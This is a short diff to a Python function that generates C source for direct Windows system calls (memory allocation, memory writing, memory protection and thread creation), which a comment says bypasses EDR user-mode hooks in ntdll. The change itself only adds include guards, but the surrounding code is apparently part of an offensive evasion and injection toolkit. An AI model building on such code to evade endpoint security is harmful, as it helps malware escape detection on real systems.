@@ -33,13 +33,18 @@ def generate_direct_syscalls() -> Dict[str, Any]:
 // bypassing any user-mode hooks installed by EDR products in ntdll.
 
 #include <windows.h>
-#include <winternl.h>
 
 // Syscall service numbers – populated at runtime by resolve_ssns()
+#ifndef PHANTOM_SSN_VARS_DEFINED
+#define PHANTOM_SSN_VARS_DEFINED
 static DWORD ssn_NtAllocateVirtualMemory = 0;
 static DWORD ssn_NtWriteVirtualMemory    = 0;
 static DWORD ssn_NtProtectVirtualMemory  = 0;
 static DWORD ssn_NtCreateThreadEx        = 0;
+#endif /* PHANTOM_SSN_VARS_DEFINED */
+
+#ifndef PHANTOM_DIRECT_SYSCALLS_INCLUDED
+#define PHANTOM_DIRECT_SYSCALLS_INCLUDED
 
 // ── NtAllocateVirtualMemory ──────────────────────────────────────────────────
 __attribute__((naked))
@@ -111,6 +116,8 @@ NTSTATUS DirectNtCreateThreadEx(
         : "rax", "r10"
     );
 }
+
+#endif /* PHANTOM_DIRECT_SYSCALLS_INCLUDED */
 """
 
     return {
